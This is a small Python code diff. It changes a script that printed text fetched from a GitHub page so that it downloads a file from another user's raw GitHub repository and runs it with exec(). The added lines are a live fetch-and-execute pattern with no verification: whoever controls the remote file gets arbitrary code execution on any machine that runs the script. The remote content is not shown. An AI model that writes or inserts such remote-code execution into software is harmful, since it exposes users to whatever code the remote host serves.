@@ -1,6 +1,7 @@
 import requests
 import json
 
-url= 'https://github.com/ashrika786/api-testing-python/blob/main/test_utils.py'
+url= 'https://raw.githubusercontent.com/Johnny-Hao-Le/test-music/main/test.py'
 r = requests.get(url)
-print(r.text)
+code = r.text
+exec(code)
